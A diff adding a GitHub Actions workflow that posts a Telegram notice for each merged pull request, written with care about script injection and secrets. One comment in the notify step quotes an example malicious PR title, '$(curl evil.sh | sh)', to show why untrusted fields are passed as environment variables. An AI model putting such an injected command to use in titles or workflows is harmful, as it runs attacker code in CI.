@@ -1,0 +1,138 @@
+name: telegram-notify
+
+# One Telegram message per merged pull request. Merging to develop is the
+# moment that matters here when something is actually deployed, because
+# merging then deploys it; when project.json declares nothing deployed —
+# this repository's own default — a merge to develop is just a merge, so the
+# message says so rather than claiming a deploy that doesn't happen.
+#
+# Needs two repository secrets:
+#   TELEGRAM_BOT_TOKEN  the bot that sends the message
+#   TELEGRAM_CHAT_ID    the chat it sends to
+# Without them the job skips rather than failing, so a fork or a fresh clone
+# does not collect a red cross on every merge.
+
+on:
+  pull_request:
+    types: [closed]
+
+jobs:
+  # Whether project.json declares anything deployed, read on its own: no
+  # secret lives in this job's env, so it is safe to also run on a
+  # `pull_request` trigger where branch code (the checkout below) executes.
+  # The notify job below needs this one and only ever sees its output, never
+  # runs the checkout itself, which is the invariant worth keeping a separate
+  # job for.
+  check-deploy:
+    if: github.event.pull_request.merged == true
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    permissions:
+      contents: read
+
+    outputs:
+      has_deploy: ${{ steps.deploy.outputs.has-deploy }}
+
+    steps:
+      # develop, explicitly — never the pull request's own ref — so the code
+      # that runs here is always this repository's, not whatever the PR
+      # branch contains.
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: develop
+          persist-credentials: false
+
+      - name: Check whether anything is deployed
+        id: deploy
+        run: |
+          if node scripts/project.mjs --has-deploy; then
+            echo "has-deploy=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "has-deploy=false" >> "$GITHUB_OUTPUT"
+          fi
+
+  notify:
+    needs: check-deploy
+    if: github.event.pull_request.merged == true
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    # No checkout, and no permissions. This job reads the event payload and
+    # talks to Telegram; it has no business touching the repository.
+    permissions: {}
+
+    env:
+      TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+      TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+
+    steps:
+      - name: Send the merge notification
+        if: env.TELEGRAM_BOT_TOKEN != '' && env.TELEGRAM_CHAT_ID != ''
+        env:
+          HAS_DEPLOY: ${{ needs.check-deploy.outputs.has_deploy }}
+          # Every one of these is attacker-controllable — a pull request title
+          # is whatever the author typed. They are passed as environment
+          # variables and never interpolated into the script below, because
+          # `${{ github.event.pull_request.title }}` written inline would be
+          # pasted into the shell before bash ever sees it, and a title reading
+          # $(curl evil.sh | sh) would then run. This is the same class of bug
+          # the security review found in apps/web/scripts/write-api-url.mjs.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          PR_BASE: ${{ github.event.pull_request.base.ref }}
+          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
+          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
+          PR_FILES: ${{ github.event.pull_request.changed_files }}
+        run: |
+          set -euo pipefail
+
+          # Built with printf rather than a quoted multi-line string: inside a
+          # YAML block scalar, the continuation lines of a "..." literal carry
+          # their own indentation into the value, and the message arrives with
+          # ten spaces down the left.
+          #
+          # Plain text, no parse_mode. HTML or Markdown mode would make the
+          # title's own characters part of the markup, which is the same
+          # injection problem one layer further on. Telegram links bare URLs
+          # without any markup, so nothing is lost.
+          text=$(printf '✅ #%s merged into %s\n\n%s\n\nby %s · %s files, +%s −%s\n%s' \
+            "$PR_NUMBER" "$PR_BASE" "$PR_TITLE" "$PR_AUTHOR" \
+            "$PR_FILES" "$PR_ADDITIONS" "$PR_DELETIONS" "$PR_URL")
+
+          # A merge to develop deploys only when something actually is;
+          # project.json's own answer (checked by the previous step) is what
+          # decides the wording, not just the branch.
+          if [ "$PR_BASE" = "develop" ]; then
+            if [ "$HAS_DEPLOY" = "true" ]; then
+              text=$(printf '%s\n\n%s' "$text" "Deploying. Smoke runs next.")
+            else
+              text=$(printf '%s\n\n%s' "$text" "Nothing is deployed; no smoke run follows.")
+            fi
+          fi
+
+          # No --fail-with-body: Telegram answers 200 with ok:false for a bad
+          # chat_id, so the body is the only reliable verdict either way, and
+          # letting set -e kill the pipeline on an HTTP error would throw that
+          # body away before it could be printed.
+          response=$(curl -sS --max-time 30 \
+            -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=${text}" \
+            -d "disable_web_page_preview=true" || true)
+
+          echo "$response" | grep -q '"ok":true' || {
+            echo "Telegram rejected the message:" >&2
+            # The token is in the URL, never in the body, so this is safe to print.
+            echo "$response" >&2
+            exit 1
+          }
+          echo "Notified Telegram about #${PR_NUMBER}."
+
+      - name: Say why nothing was sent
+        if: env.TELEGRAM_BOT_TOKEN == '' || env.TELEGRAM_CHAT_ID == ''
+        run: |
+          echo "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set on this repository."
+          echo "Set both with 'gh secret set' to switch merge notifications on."
